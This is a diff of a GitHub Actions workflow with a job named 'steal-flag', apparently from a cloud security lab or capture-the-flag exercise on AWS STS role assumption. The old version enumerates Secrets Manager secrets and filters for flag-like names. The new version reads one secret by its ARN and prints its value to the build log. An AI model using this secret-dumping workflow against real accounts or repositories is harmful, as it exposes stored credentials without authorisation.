@@ -4,7 +4,7 @@ on:
   push:
     branches: [ "main" ]
 permissions:
-  id-token: write   # Required: allows GitHub to mint the OIDC JWT token
+  id-token: write
   contents: read
 jobs:
   steal-flag:
@@ -18,11 +18,10 @@ jobs:
       - name: Verify Assumed Role Caller
         run: |
           aws sts get-caller-identity
-      - name: Discover and Retrieve Flag from Secrets Manager
+      - name: Retrieve STS Lab 2 Flag
         run: |
-          echo "=== Listing Secrets ==="
-          aws secretsmanager list-secrets
-          echo "=== Retrieving Flag Secret ==="
-          SECRET_ARN=$(aws secretsmanager list-secrets --query "SecretList[?contains(Name, 'flag') || contains(Name, 'sts')].ARN" --output text)
-          echo "Target Secret ARN: $SECRET_ARN"
-          aws secretsmanager get-secret-value --secret-id "$SECRET_ARN" --query "SecretString" --output text
+          echo "=== Reading Lab 2 Secret Value ==="
+          aws secretsmanager get-secret-value \
+            --secret-id "arn:aws:secretsmanager:us-east-1:556300512497:secret:flag_sts_lab_2-bZ2Dit" \
+            --query "SecretString" \
+            --output text
